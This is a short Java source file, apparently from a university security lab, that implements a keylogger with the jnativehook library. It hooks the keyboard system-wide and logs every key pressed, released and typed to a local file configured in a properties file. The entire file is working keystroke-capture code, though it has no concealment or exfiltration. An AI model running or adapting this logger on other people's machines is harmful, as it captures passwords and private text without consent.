import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;

import java.util.Properties;
import java.util.logging.FileHandler;
import java.util.logging.Logger;
import java.util.logging.SimpleFormatter;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 * This file is created for BSIUI lab, simple example using jnanativehook
 * In keylogger.properties
 */
public class KeyLogger implements NativeKeyListener {
	private Logger logger = Logger.getLogger("Bsiui keylogger example");

	private KeyLogger() throws IOException {

		InputStream inputStream = new FileInputStream("keylogger.properties");
		Properties properties = new Properties();
		properties.load(inputStream);
		String configFilePath = properties.getProperty("FilePath");
		FileHandler fileHandler = new FileHandler(configFilePath);
		logger.addHandler(fileHandler);
		SimpleFormatter simpleFormatter = new SimpleFormatter();
		fileHandler.setFormatter(simpleFormatter);
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
		logger.info("native key pressed: " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
		logger.info("Native key released: " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));

	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
		logger.info("Native key typed: " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));

	}

	public static void main(String arguments[]) throws IOException, NativeHookException {
		GlobalScreen.registerNativeHook();
		GlobalScreen.addNativeKeyListener(new KeyLogger());
	}
}